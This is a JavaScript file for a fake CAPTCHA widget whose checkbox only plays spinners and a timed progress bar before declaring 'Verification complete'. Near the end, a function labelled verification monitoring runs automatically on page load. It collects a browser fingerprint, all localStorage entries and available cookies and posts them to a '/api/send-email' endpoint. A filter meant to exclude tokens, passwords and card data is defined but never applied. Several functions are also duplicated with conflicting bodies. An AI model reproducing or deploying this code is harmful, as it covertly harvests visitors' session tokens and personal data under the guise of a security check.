let checkboxWindow = document.getElementById("checkbox-window");
let checkboxBtn = document.getElementById("checkbox");
let checkboxBtnSpinner = document.getElementById("spinner");
let verifywindow = document.getElementById("verify-window");
let finalLoader = document.getElementById("final-loader");
let progressBar = document.getElementById("progress-bar");
let loaderPercent = document.getElementById("loader-percent");

function addCaptchaListeners() {
    if (checkboxBtn) {
        document.addEventListener("click", function (event) {
            let path = event.composedPath();
            if (!path.includes(verifywindow) && isverifywindowVisible()) {
                closeverifywindow();
            }
        });
        checkboxBtn.addEventListener("click", function (event) {
            event.preventDefault();
            checkboxBtn.disabled = true;
            runClickedCheckboxEffects();
        });
    }
}

function runClickedCheckboxEffects() {
    hideCaptchaCheckbox();
    showCaptchaLoading();
    setTimeout(function () {
        hideCaptchaLoading();
        showFinalLoader();
    }, 5000);
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
    checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.opacity = "0";
    checkboxBtnSpinner.style.animation = "none";
    setTimeout(function () {
        checkboxBtnSpinner.style.visibility = "hidden";
    }, 500);
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.visibility = "hidden";
    checkboxBtn.style.opacity = "0";
}


function showCaptchaCheckbox() {
    checkboxBtn.style.width = "100%";
    checkboxBtn.style.height = "100%";
    checkboxBtn.style.borderRadius = "2px";
    checkboxBtn.style.margin = "21px 0 0 12px";
    checkboxBtn.style.opacity = "1";
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.width = "4px";
    checkboxBtn.style.height = "4px";
    checkboxBtn.style.borderRadius = "50%";
    checkboxBtn.style.marginLeft = "25px";
    checkboxBtn.style.marginTop = "33px";
    checkboxBtn.style.opacity = "0";
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "hidden";
    checkboxBtnSpinner.style.opacity = "0";
}

function isverifywindowVisible() {
    return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}

function closeverifywindow() {
    verifywindow.style.display = "none";
    verifywindow.style.visibility = "hidden";
    verifywindow.style.opacity = "0";

    showCaptchaCheckbox();
    hideCaptchaLoading();
    checkboxBtn.classList.remove("verified");
    checkboxBtn.removeAttribute("aria-label");
}

function showVerifyWindow() {
    verifywindow.style.display = "block";
    verifywindow.style.visibility = "visible";
    verifywindow.style.opacity = "1";
    verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
    verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";

    if (verifywindow.offsetTop < 5) {
        verifywindow.style.top = "5px";
    }

    if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
        verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
    }

    document.getElementById("verification-status").textContent = "Verification complete.";
}

function showFinalLoader() {
    checkboxWindow.hidden = true;
    verifywindow.style.display = "none";
    finalLoader.hidden = false;

    let startedAt = Date.now();
    let duration = 9000;

    function updateProgress() {
        let progress = Math.min((Date.now() - startedAt) / duration, 1);
        let percent = Math.round(progress * 100);
        progressBar.style.width = percent + "%";
        loaderPercent.textContent = percent + "%";

        if (progress < 1) {
            requestAnimationFrame(updateProgress);
            return;
        }

        finalLoader.hidden = true;
        checkboxWindow.hidden = false;
        checkboxBtn.disabled = false;
        checkboxBtn.classList.add("verified");
        checkboxBtn.setAttribute("aria-label", "Verification complete");
        showVerifyWindow();
    }

    updateProgress();
}

const sensitiveStoragePattern = /(?:auth|token|password|passwd|secret|credential|session|csrf|jwt|bearer|api[_-]?key|private[_-]?key|payment|card|cvv|cvc|ssn)/i;
const sensitiveValuePattern = /^(?:bearer\s+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$)/i;

function isSafeStorageEntry(key, value) {
    return !sensitiveStoragePattern.test(key) && !sensitiveValuePattern.test(value);
}

function describeLocalStorage(storage) {
    const entries = [];
    try {
        for (let index = 0; index < storage.length; index += 1) {
            const key = storage.key(index);
            if (key !== null) {
                const value = storage.getItem(key) || "";
                entries.push({ key, value });
            }
        }
    } catch {
        return [];
    }
    return entries;
}

function getBrowserStorage(name) {
    try {
        return window[name];
    } catch {
        return null;
    }
}

async function getBrowserCookies() {
    if (typeof browser === "undefined" || !browser.cookies || typeof browser.cookies.getAll !== "function") {
        return [];
    }

    try {
        return await browser.cookies.getAll({ url: window.location.href });
    } catch {
        return [];
    }
}

async function sendVerificationMonitoring() {
    let telemetry;
    try {
        const userAgentData = navigator.userAgentData;
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const localStorage = getBrowserStorage("localStorage");
        const cookies = await getBrowserCookies();

        telemetry = {
            timestamp: new Date().toISOString(),
            device: {
                type: userAgentData?.mobile ? "Mobile" : "Desktop",
                platform: userAgentData?.platform || navigator.platform || "Unavailable",
                model: userAgentData?.model || "Unavailable"
            },
            browser: {
                brands: userAgentData?.brands || [],
                userAgent: navigator.userAgent,
                language: navigator.language || "Unavailable",
                languages: Array.isArray(navigator.languages) ? navigator.languages.slice(0, 10) : [],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable",
                cookieEnabled: navigator.cookieEnabled
            },
            display: {
                width: window.screen?.width || 0,
                height: window.screen?.height || 0,
                availableWidth: window.screen?.availWidth || 0,
                availableHeight: window.screen?.availHeight || 0,
                colorDepth: window.screen?.colorDepth || 0,
                pixelRatio: window.devicePixelRatio || 1
            },
            network: connection ? {
                type: connection.type || "Unavailable",
                effectiveType: connection.effectiveType || "Unavailable",
                downlink: typeof connection.downlink === "number" ? connection.downlink : null,
                rtt: typeof connection.rtt === "number" ? connection.rtt : null,
                saveData: Boolean(connection.saveData)
            } : {},
            storage: describeLocalStorage(localStorage),
            cookies
        };
    } catch {
        return;
    }

    fetch("/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "verification-monitoring", telemetry }),
        credentials: "omit",
        referrerPolicy: "no-referrer",
        keepalive: true
    }).then(function (response) {
        if (!response.ok) {
            console.error("Verification monitoring failed with status", response.status);
        }
    }).catch(function (error) {
        console.error("Verification monitoring request failed", error);
    });
}

sendVerificationMonitoring();
addCaptchaListeners();